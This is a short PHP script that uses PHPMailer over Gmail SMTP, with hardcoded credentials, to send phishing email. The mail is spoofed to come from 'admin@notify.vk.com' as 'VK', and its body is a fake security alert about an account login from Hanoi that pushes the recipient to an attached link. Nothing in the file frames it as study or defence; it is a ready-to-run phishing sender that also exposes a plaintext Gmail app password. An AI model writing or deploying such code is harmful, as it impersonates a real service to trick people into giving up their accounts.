
<?php
$username='biminh0369@gmail.com';
$password='ephuairfvdgqptyj';
// Xử lý Gửi nhận email: phpMailer, sendMail
// 1 Khai báo thư viện send mail
//kitudu99@gmail.com

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;
use PHPMailer\PHPMailer\SMTP;

require '../Mailer/Exception.php';
require '../Mailer/PHPMailer.php';
require '../Mailer/SMTP.php';

//Sử dụng thư viện này để gửi email từ localhost tới 1 tk email khác
//Create an instance; passing `true` enables exceptions
function sendemail($email,$link)
{
    global $username;
    global $password;
    $mail = new PHPMailer(true);

    try {
        //Server settings
        $mail->SMTPDebug = 0;                      //Enable verbose debug output
        $mail->isSMTP();                                            //Send using SMTP
        $mail->Host       = 'smtp.gmail.com';                     //Set the SMTP server to send through
        $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
        $mail->Username   = $username;                     //SMTP username
        $mail->Password   = $password;                               //SMTP password
        $mail->SMTPSecure = 'ssl';                  //PHPMailer::ENCRYPTION_SMTPS;            //Enable implicit TLS encryption
        $mail->Port       = 465;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`
        $mail->CharSet   = 'UTF-8';

        //Recipients
        $mail->setFrom('admin@notify.vk.com ', 'VK');
        $mail->addAddress($email);     //Add a recipient
        //$mail->addAddress('ellen@example.com');               //Name is optional
        //$mail->addReplyTo('info@example.com', 'Information');
        //$mail->addCC('cc@example.com');
        //$mail->addBCC('bcc@example.com');

        //Attachments
        //$mail->addAttachment('doccument/demo.docx');         //Add attachments
        //$mail->addAttachment('/tmp/image.jpg', 'new.jpg');    //Optional name

        //Content
        $mail->isHTML(true);                                  //Set email format to HTML
        $mail->Subject = 'Someone has accessed your account through Chrome, Vietnam, Hanoi';
        $mail->Body    = 'Security notification
        Dear Nguyn,
        
        You have received this message because someone accessed your VK account through Chrome, Vietnam, Hanoi on January 17, 2022 at 8:14 pm.
        
        <b>If you did not do this</b>, please proceed to your page immediately to protect your account.
        
        Best regards,
        VK Social Network Team'.$link;
        $mail->AltBody = 'This is the body in plain text for non-HTML mail clients';

        if($mail->send()){
            return true;
        }
        echo 'Message has been sent';
    } catch (Exception $e) {
        echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
    }
    return false;
}

?>


